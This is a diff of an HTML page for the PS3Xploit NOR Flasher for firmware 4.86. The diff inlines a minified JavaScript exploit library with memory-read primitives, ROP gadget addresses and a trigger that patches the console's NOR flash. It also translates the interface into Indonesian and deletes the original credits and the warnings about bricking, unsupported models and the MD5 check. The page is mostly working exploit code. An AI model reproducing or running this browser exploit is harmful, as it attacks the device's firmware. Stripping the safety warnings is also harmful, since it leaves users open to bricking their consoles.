@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
-<script src="ps3xploit_writer_v202.js"></script>
+<script>var usb_fp,stack_frame,jump_2,jump_1,usb_fp_addr,stack_frame_addr,jump_2_addr,jump_1_addr,n,y,m,d,debug=!1,br="<br>",hr="<hr>",t_out=0,total_loops=0,max_loops=20,sp_exit=2413354176,toc_addr=0,gadget1_addr=0,gadget2_addr=0,gadget3_addr=0,gadget4_addr=0,gadget5_addr=0,gadget6_addr=0,gadget7_addr=0,gadget8_addr=0,used_port=0;function asciiAt(e,t){return 255&e.charCodeAt(t)}function str2ascii(e){for(var t="",n=0;n<e.length;n++)t+=e.charCodeAt(n).toString(16);return t}function hexh2bin(e){return String.fromCharCode(e)}function hexw2bin(e){return String.fromCharCode(e>>16)+String.fromCharCode(e)}function s2hex(e){for(var t=[],n=0;n<e.length;n++)t.push(hex16(e.charCodeAt(n).toString(16)));return t.join("")}function hex32(e){return("00000000"+e).substr(-8)}function hex16(e){return("0000"+e).substr(-4)}function hex8(e){return("00"+e).substr(-2)}function convertString(e){var t,n=str2ascii(e);n.length%4!=0&&(n+="00");var d,r,c=[];for(d=0,r=n.length;d<r;d+=4)t=n.substr(d,4),c.push(String.fromCharCode(parseInt(t,16)));return c.join("")}function sleep(e){for(var t=(new Date).getTime(),n=0;n<1e7&&!((new Date).getTime()-t>e);n++);}function logAdd(e){!0===debug&&(""===document.getElementById("log").innerHTML&&(document.getElementById("log").innerHTML=hr),document.getElementById("log").innerHTML+=e+br)}function clearLogEntry(){document.getElementById("log").innerHTML=""}function writeEnvInfo(){document.getElementById("footer").innerHTML=hr+"<h3>PS3 System Browser Info:</h3>"+navigator.userAgent+br+navigator.appName+" ("+navigator.platform+")"+br+(new Date).toTimeString()+br}function setCharAt(e,t,n){return t>e.length-1?e:e.substr(0,t)+n+e.substr(t+1)}function fromIEEE754(e,t,n){for(var d=[],r=e.length;r;r-=1)for(var c=e[r-1],u=8;u;u-=1)d.push(c%2?1:0),c>>=1;d.reverse();var l=d.join(""),o=(1<<t-1)-1,a=parseInt(l.substring(0,1),2)?-1:1,m=parseInt(l.substring(1,1+t),2),s=parseInt(l.substring(1+t),2);return(m===(1<<t)-1?0!==s?NaN:a*(1/0):m>0?a*Math.pow(2,m-o)*(1+s/Math.pow(2,n)):0!==s?a*Math.pow(2,-(o-1))*(s/Math.pow(2,n)):0*a).noExponents()}function generateIEEE754(e,t){return fromIEEE754(new Array(e>>24&255,e>>16&255,e>>8&255,255&e,t>>24&255,t>>16&255,t>>8&255,255&t),11,52)}function generateExploit(e,t){return generateIEEE754(e,(e<<32|(t>>1)-1)-e)}function readMemory(e,t){document.getElementById("exploit").style.src="local("+generateExploit(e,t)+")"}function checkMemory(e,t,n){if(readMemory(e,t),!0===debug){var d=document.getElementById("exploit").style.src.substr(6,n);return logAdd("checkMemory: "+s2hex(d)),d}return document.getElementById("exploit").style.src.substr(6,n)}function trigger(e){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+e.toString(16)+")")}function success(e){showResult(e)}function enable_trigger(){document.getElementById("btnTrigger")&&(document.getElementById("btnTrigger").disabled=!1),document.getElementById("btnReset")&&(document.getElementById("btnReset").disabled=!1)}function resetOptions(e){document.getElementById("usb0")&&(document.getElementById("usb0").checked=!0),document.getElementById("usb1")&&(document.getElementById("usb1").checked=!1),document.getElementById("usb6")&&(document.getElementById("usb6").checked=!1),document.getElementById("sd")&&(document.getElementById("sd").checked=!1),document.getElementById("cf")&&(document.getElementById("cf").checked=!1),document.getElementById("ms")&&(document.getElementById("ms").checked=!1),1==e&&(document.getElementById("result").innerHTML=""),cleanGUI(),used_port=0}function cleanGUI(){enable_cb(),enable_btn(),document.getElementById("btnTrigger")&&(document.getElementById("btnTrigger").disabled=!0),document.getElementById("step2")&&(document.getElementById("step2").innerHTML=""),document.getElementById("log").innerHTML="",t_out=0,total_loops=0}function disable_cb(){document.getElementById("usb0")&&(document.getElementById("usb0").disabled=!0),document.getElementById("usb1")&&(document.getElementById("usb1").disabled=!0),document.getElementById("usb6")&&(document.getElementById("usb6").disabled=!0),document.getElementById("sd")&&(document.getElementById("sd").disabled=!0),document.getElementById("cf")&&(document.getElementById("cf").disabled=!0),document.getElementById("ms")&&(document.getElementById("ms").disabled=!0)}function enable_cb(){document.getElementById("usb0")&&(document.getElementById("usb0").disabled=!1),document.getElementById("usb1")&&(document.getElementById("usb1").disabled=!1),document.getElementById("usb6")&&(document.getElementById("usb6").disabled=!1),document.getElementById("sd")&&(document.getElementById("sd").disabled=!1),document.getElementById("cf")&&(document.getElementById("cf").disabled=!1),document.getElementById("ms")&&(document.getElementById("ms").disabled=!1)}function disable_btn(){document.getElementById("btnROP")&&(document.getElementById("btnROP").disabled=!0),document.getElementById("btnReset")&&(document.getElementById("btnReset").disabled=!0),document.getElementById("btnTrigger")&&(document.getElementById("btnTrigger").disabled=!0)}function enable_btn(){document.getElementById("btnROP")&&(document.getElementById("btnROP").disabled=!1),document.getElementById("btnReset")&&(document.getElementById("btnReset").disabled=!1),document.getElementById("btnTrigger")&&(document.getElementById("btnTrigger").disabled=!1)}function usb(e){var t=null,n=null,d=null,r=null,c=null,u=null;if(document.getElementById("usb0")&&(t=document.getElementById("usb0")),document.getElementById("usb1")&&(n=document.getElementById("usb1")),document.getElementById("usb6")&&(d=document.getElementById("usb6")),document.getElementById("sd")&&(r=document.getElementById("sd")),document.getElementById("cf")&&(c=document.getElementById("cf")),document.getElementById("ms")&&(u=document.getElementById("ms")),null!==t&&null!==n&&null!==d&&null!==r&&null!==c&&null!==u)!1===r.checked&&!1===c.checked&&!1===u.checked&&!1===t.checked&&!1===n.checked&&!1===d.checked&&(t.checked=!0,e=0);else{if(null===t||null===n||null===d)return void logAdd("Malformed HTML checkbox options!");!1===t.checked&&!1===n.checked&&!1===d.checked&&(t.checked=!0,e=0)}switch(e){case 1:used_port=1,t.checked=!1,d.checked=!1,null!==r&&(r.checked=!1),null!==c&&(c.checked=!1),null!==u&&(u.checked=!1);break;case 6:used_port=6,t.checked=!1,n.checked=!1,null!==r&&(r.checked=!1),null!==c&&(c.checked=!1),null!==u&&(u.checked=!1);break;case 1e3:used_port=1e3,t.checked=!1,n.checked=!1,d.checked=!1,null!==c&&(c.checked=!1),null!==u&&(u.checked=!1);break;case 1001:used_port=1001,t.checked=!1,n.checked=!1,d.checked=!1,null!==r&&(r.checked=!1),null!==u&&(u.checked=!1);break;case 1002:used_port=1002,t.checked=!1,n.checked=!1,d.checked=!1,null!==r&&(r.checked=!1),null!==c&&(c.checked=!1);break;default:used_port=0,n.checked=!1,d.checked=!1,null!==r&&(r.checked=!1),null!==c&&(c.checked=!1),null!==u&&(u.checked=!1)}}function showResult(e){document.getElementById("result").innerHTML=e}function findJsVariableOffset(e,t,n,d){readMemory(n,d);for(var r=document.getElementById("exploit").style.src.substr(6,d),c=0;c<2*r.length;c+=16)if(r.charCodeAt(c/2)===t.charCodeAt(0)){for(var u=0,l=0;l<2*t.length&&r.charCodeAt((c+l)/2)===t.charCodeAt(l/2);l+=2)u+=1;if(u===t.length){var o=n+c+4;return logAdd("Found "+e+" at: 0x"+o.toString(16)+br+s2hex(t)),o}}var a=n+d;return logAdd("The string variable named "+e+" could not be located in range 0x"+n.toString(16)+" - 0x"+a.toString(16)),0}function ps3chk(){var e=navigator.userAgent,t=e.substring(e.indexOf("5.0 (")+5,e.indexOf(") Apple")-7),n=e.substring(e.indexOf("5.0 (")+19,e.indexOf(") Apple"));switch(resetOptions(),t){case"PLAYSTATION":switch(n){case"4.86":alert("PERHATIAN!\n\nVersi firmware Anda membutuhkan HFW (Hybrid Firmware) untuk diinstal. OFW tidak didukung!\n\nHalaman ini tidak dapat membedakan antara OFW dan HFW."),toc_addr=7296344,gadget1_addr=620036,gadget2_addr=6352856,gadget3_addr=890500,gadget4_addr=897108,gadget5_addr=1692588,gadget6_addr=4376440,gadget7_addr=4339796,gadget8_addr=2862264;break;default:alert("PS3 Anda tidak ada di HFW 4.86! Versi FW Anda saat ini adalah "+n+", yang tidak kompatibel dengan PS3Xploit Flasher. Semua fitur telah dinonaktifkan"),disable_btn(),disable_cb()}break;default:alert("Anda tidak berada di Sistem PlayStation! Semua fitur telah dinonaktifkan"),disable_btn(),disable_cb()}}String.prototype.replaceAt=function(e,t){return this.substr(0,e)+t+this.substr(e+t.length)},Number.prototype.noExponents=function(){var e=String(this).split(/[eE]/);if(1==e.length)return e[0];var t="",n=this<0?"-":"",d=e[0].replace(".",""),r=Number(e[1])+1;if(r<0){for(t=n+"0.";r++;)t+="0";return t+d.replace(/^\-/,"")}for(r-=d.length;r--;)t+="0";return d+t};</script>
 <head>
 <meta charset="UTF-8">
-<title>PS3Xploit Team - PS3 NOR Flasher v2.0.2 - HDD Edition</title>
+<title>PS3Xploit - PS3 NOR Flasher </title>
 <script>
 function initROP()
 {
@@ -42,13 +42,13 @@ function initROP()
 		+hexw2bin(gadget3_addr)+hexw2bin(toc_addr)+unescape("\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141")+hexw2bin(gadget7_addr)+hexw2bin(toc_addr)+unescape("\uFD7E");
 		function reload()
 		{
-			showResult(hr+"<h1><b>Exploit Initialization..."+br+"<font color=%22000000%22>Progress: "+((100/max_loops)*total_loops).toString()+"%, please wait...</font></b></h1>");
+			showResult(hr+"<h1><b>Inisialisasi Eksploitasi ..."+br+"<font color=%22000000%22>Progress: "+((100/max_loops)*total_loops).toString()+"%, mohon tunggu...</font></b></h1>");
 			t_out=setTimeout(initROP,1000);
 		};
 		function fail()
 		{
 			total_loops=0;
-			showResult(hr+"<h1><b>Exploit Initialization FAILED!</h1><h2><font color=%22000000%22><a href=\"javascript:window.location.reload()\">Refresh this page</a> & try again...</font></b></h2>");
+			showResult(hr+"<h1><b>Inisialisasi Eksploitasi GAGAL!</h1><h2><font color=%22000000%22><a href=\"javascript:window.location.reload()\">Refresh halaman ini</a> & coba lagi...</font></b></h2>");
 			cleanGUI();
 		};
 		
@@ -177,13 +177,13 @@ function initROP()
 		if((j2===jump_2)&&(j1===jump_1)&&(u===usb_fp))
 		{
 			if(t_out!=0){clearTimeout(t_out);}
-			document.getElementById('step2').innerHTML="<h3><b><font color=%22386E38%22>Initialization succeeded. Proceed to Step 3..</font></b></h3>";
-			showResult(hr+"<h1><b><font color=%22386E38%22>Exploit Initialization SUCCESS...!</font></b></h1><h3><b><font color=%22000000%22>You can now proceed to patch the NOR Flash Memory!</font></b></h3>");
+			document.getElementById('step2').innerHTML="<h3><b><font color=%22386E38%22>Inisialisasi berhasil. Lanjutkan ke Langkah 3 ..</font></b></h3>";
+			showResult(hr+"<h1><b><font color=%22386E38%22>Inisialisasi Eksploitasi SUKSES ...!</font></b></h1><h3><b><font color=%22000000%22>Anda sekarang dapat melanjutkan untuk menambal Memori Flash NOR!</font></b></h3>");
 			enable_trigger();
 		}
 		else 
 		{
-			logAdd("String mismatch in memory!");
+			logAdd("Ketidakcocokan string dalam memori!");
 			if(total_loops<max_loops)reload();
 			else fail();
 		}
@@ -191,7 +191,7 @@ function initROP()
 	catch(e) 
 	{
 		debug=true;
-		logAdd(br+"Exploit initialization failed because the following exception was thrown during execution:"+br+e);
+		logAdd(br+"Inisialisasi eksploitasi gagal karena pengecualian berikut dilemparkan selama eksekusi:"+br+e);
 		debug=false;
 	}
 }
@@ -199,42 +199,24 @@ function triggerX()
 {
 	clearLogEntry();
 	document.getElementById('step2').innerHTML="";
-	showResult(hr+"<h1><b>Proceeding to patch NOR Flash Memory...</b></h1><h3><b><font color=%22000000%22>Please wait, the patch operation takes a few minutes!</font></b></h3>");
+	showResult(hr+"<h1><b>Melanjutkan untuk menambal NOR Flash Memory ...</b></h1><h3><b><font color=%22000000%22>Harap tunggu, operasi patch memakan waktu beberapa menit!</font></b></h3>");
 	disable_cb();
 	disable_btn();
 	setTimeout(trigger,1000,jump_1_addr);
-	setTimeout(success,2000,hr+"<h1><b><font color=%22386E38%22>NOR Flash memory patch operation completed..!</font></b></h1><h3><b><font color=%22000000%22>You can dump the NOR now & check that the patch has been applied successfully."+br+"Then reboot to enable the patches & install the 4.86 CFW of your choice...</font></b></h3>");
+	setTimeout(success,2000,hr+"<h1><b><font color=%22386E38%22>NOR flash memory patch selesai! ..</font></b></h1><h3><b><font color=%22000000%22>Anda dapat dump NOR sekarang & memeriksa apakah patch telah berhasil diterapkan."+br+"Kemudian restart untuk mengaktifkan patch & instal 4,86 CFW pilihan Anda ...</font></b></h3>");
 }
 </script>
 </head>
 	<body id="BodyID" bgcolor="#FFD097">
-	<div id="HeaderID" style="color:#CC2010">
-	<h1>PS3 NOR Flasher v2.0.2 for HFW 4.86 - HDD Edition</h1>
-	<h4><font color="#000000">by PS3Xploit Team: </font></h2><b> W | esc0rtd3w | habib | bguerville</b></font><hr></h4>
-	<h4><font color="#000000">v2.0.2 Update crafted by: </font>bguerville <font color="#000000">(ROP, Javascript & Debugging) |</font> esc0rtd3w <font color="#000000">(Debugging & Testing)  |</font> habib <font color="#000000">(flash_486.hex)</font><hr></h4>
-	<font color="#000000">Many thanks to xerpi for the userland memory leak exploit ps3 port, zecoxao & Joonie for their early & continued support, mysis for documenting vsh exports & plugins, the psdevwiki contributors of course, STLcardsWS for his long standing contribution & all ps3 community hackers/devs past & present, you know who you are...<br>Thanks as well to littlebalup for providing the idea & the related javascript used to make this HDD edition.<hr>
-	<h3>Supports 4.86 HFW Firmware ONLY!!!<br>
-	<font color="#CC2010">DO NOT USE ON ANY OTHER FIRMWARE VERSION OR ON CFW OR YOU WILL BRICK YOUR CONSOLE!</font>
-	<br>Supports Phat Models CECH-Hxx/Jxx/Kxx/Lxx/Mxx/Pxx/Qxx
-	<br>Supports Slim Models CECH-20xx and CECH-21xx 
-	<br>Supports Slim Models CECH-25xx <font color="#CC2010">(minver 3.56 or lower ONLY, always check with minverchk.pup or risk a partial brick!)</font></h3>
-	Instructions/additional details & news on <a href="http://www.psx-place.com/forums/PS3Xploit">http://www.psx-place.com/forums/PS3Xploit</a><br><br>MinVerCheck: <a href="http://ps3xploit.com/files/minvercheck.zip">http://ps3xploit.com/files/minvercheck.zip</a><br><br>PS3Xploit Team Donations: <a href="https://www.paypal.me/ps3xploit">https://www.paypal.me/ps3xploit</a><br></font>
-	<hr>
-	</div>
-	<font color="#CC2010" autofocus>
-	<h4><b>** CAUTION: MISHANDLED FIRMWARE FLASHING CAN LEAD TO A BRICK - USE AT YOUR OWN RISK!!! **</b>
-	<br><b>** DO NOT USE THIS ON CECH-3xxx/4xxx OR YOU WILL BRICK YOUR CONSOLE!!! **</b>
-	<br><b>** DO NOT POWER OFF THE CONSOLE ONCE STARTED. IT MAY RESULT IN A BRICK! **</b>
-	<br><b>** MAKE SURE TO USE AN UNMODIFIED & MD5 CHECKED "flash_486.jpg" FILE! **</b>
-	<br><b>** THE MD5 OF "flash_486.jpg" MUST BE: 2D74B066E7453E6B1336E36C410FB1EB **</b></h4>
+	<div id="HeaderID">
 	</font>
-	<h3><i><b>THE PATCHING OPERATION MAY TAKE A FEW MINUTES</b></i></h3>
-	<hr><h2><b><u>Step</u> 1:</b></h2>Download the PS3Xploit 4.86 Flash Memory patch file to the PS3 Photo folder so the exploit can load it from the internal HDD.
-	<h3><b><a href="flash_486.jpg">Press <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAASCAIAAAA2bnI+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjEuNv1OCegAAALISURBVDhPY/h/YToaOruxz8bGVkpcgpeHR1JM3MbGZv+ydjQ1QISic8fcmmB3SylxYS5ubl5uHiEVWR5eHm5ubnFRIW9Hk1WTSpEVI3R2lsXKSIpycnPzcHFz8HBzSAroLCrn01NkB5rBxQ00S1JMODfOG64eqnNKfSrQKqDxQMDFw80jyKdQG6F1Y7pCXSS3ED9QEGg1Dw8P0PKu8niEzhOrWmWlxCDagICTh1vc2Uj3RLf6ngbdw13CNjpAbUA7IUBaQvTUmg6ozsxoL6gwCHBxi/Cq9KXone4TsNNW396gOSOXS5AX6GA48HcxB+l8fmS2nLQ4VAwUMFyijrraJ3ulUl0FefmkU930z00Uj7AFSsAB0M1nN05g8PDwgPC5gH4BOktKSH19lcr8fD5ZMS4eXl45UfUVpTr72/j15Xm5gMEHBZaWlgzCwrCA4QbGH5dcgZ/W+T6JMBuIJcDQEnU3VL0yWbkqjI+PE8gFCXJxCQoKMoiIiIB4YHcKW6jqHulUW1TCJynCCwZ8QCTEp9CbpLOnRchMFRi+QJXAQAbpdHZ2BnIE+PnFpcW0J2YYn50s7mAoKCUuKCkuJAki+aXEJAxU9Xa3a0/IEJQSERIQAOo0NTVleHxwpoqirKSYmKyjoeGFqWbXZ1ruaLPY2Wa+q818d5vFrjazXW3WO9pNLk7VvzVbPsReUlxcTUnu5JouUKxUZYZJy8nqFUVYrGu0WtdgtqERiMzXN1qsB5FAZLq+0XJtg9m6Buu+fElFufwEX2h8Xtvaa26ir6KprqyFBaGJW5rqP9k/CaoTiOa2ZVmbG2niBRoaGrYWRiv6CyFaoDqBaO2UUmc7S11dXT1sACjubGexvC8frh6hE4hubOutz4t0d7Y1MjIyhgEg29PFtrkw5tb2XmTFKDohaNfCZisrK3NzcwsLCwi5eVYtmpr/F6YDAKT6XV0sp3K+AAAAAElFTkSuQmCC"> Here. File → Save Target → System Storage (Photo)</a></b></h3>
-	<p>Patch will be saved as : <b><span id="filePath"></span></b></p>
+	<h3><i><b>Flasher NOR 4.86HFW</b></i></h3>
+	<hr><h2><b><u>Step</u> 1:</b></h2>
+	<h3><b><a href="flash_486.jpg">Tekan <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAASCAIAAAA2bnI+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjEuNv1OCegAAALISURBVDhPY/h/YToaOruxz8bGVkpcgpeHR1JM3MbGZv+ydjQ1QISic8fcmmB3SylxYS5ubl5uHiEVWR5eHm5ubnFRIW9Hk1WTSpEVI3R2lsXKSIpycnPzcHFz8HBzSAroLCrn01NkB5rBxQ00S1JMODfOG64eqnNKfSrQKqDxQMDFw80jyKdQG6F1Y7pCXSS3ED9QEGg1Dw8P0PKu8niEzhOrWmWlxCDagICTh1vc2Uj3RLf6ngbdw13CNjpAbUA7IUBaQvTUmg6ozsxoL6gwCHBxi/Cq9KXone4TsNNW396gOSOXS5AX6GA48HcxB+l8fmS2nLQ4VAwUMFyijrraJ3ulUl0FefmkU930z00Uj7AFSsAB0M1nN05g8PDwgPC5gH4BOktKSH19lcr8fD5ZMS4eXl45UfUVpTr72/j15Xm5gMEHBZaWlgzCwrCA4QbGH5dcgZ/W+T6JMBuIJcDQEnU3VL0yWbkqjI+PE8gFCXJxCQoKMoiIiIB4YHcKW6jqHulUW1TCJynCCwZ8QCTEp9CbpLOnRchMFRi+QJXAQAbpdHZ2BnIE+PnFpcW0J2YYn50s7mAoKCUuKCkuJAki+aXEJAxU9Xa3a0/IEJQSERIQAOo0NTVleHxwpoqirKSYmKyjoeGFqWbXZ1ruaLPY2Wa+q818d5vFrjazXW3WO9pNLk7VvzVbPsReUlxcTUnu5JouUKxUZYZJy8nqFUVYrGu0WtdgtqERiMzXN1qsB5FAZLq+0XJtg9m6Buu+fElFufwEX2h8Xtvaa26ir6KprqyFBaGJW5rqP9k/CaoTiOa2ZVmbG2niBRoaGrYWRiv6CyFaoDqBaO2UUmc7S11dXT1sACjubGexvC8frh6hE4hubOutz4t0d7Y1MjIyhgEg29PFtrkw5tb2XmTFKDohaNfCZisrK3NzcwsLCwi5eVYtmpr/F6YDAKT6XV0sp3K+AAAAAElFTkSuQmCC"> Disini. File → Save Target → System Storage (Photo)</a></b></h3>
+	<p><b><span id="filePath"></span></b></p>
 	<h2><b><u>Step</u> 2:</b></h2>
-	<button id="btnROP" type="button" onclick="initROP();">Initialize exploitation</button>
-	<div id="step2" style="color:#CC2010"><h3><b>Wait for the exploit initialization to succeed...</b></h3></div>
+	<button id="btnROP" type="button" onclick="initROP();">Inisialisasi eksploitasi</button>
+	<div id="step2"><h3><b>Tunggu inisialisasi exploit untuk berhasil ...</b></h3></div>
 	<h2><b><u>Step</u> 3:</b></h2>
 	<button id="btnTrigger" disabled="true" type="button" onclick="triggerX();">Patch NOR Flash Memory</button>
 	<div id="result" style="color:#CC2010"></div><br>
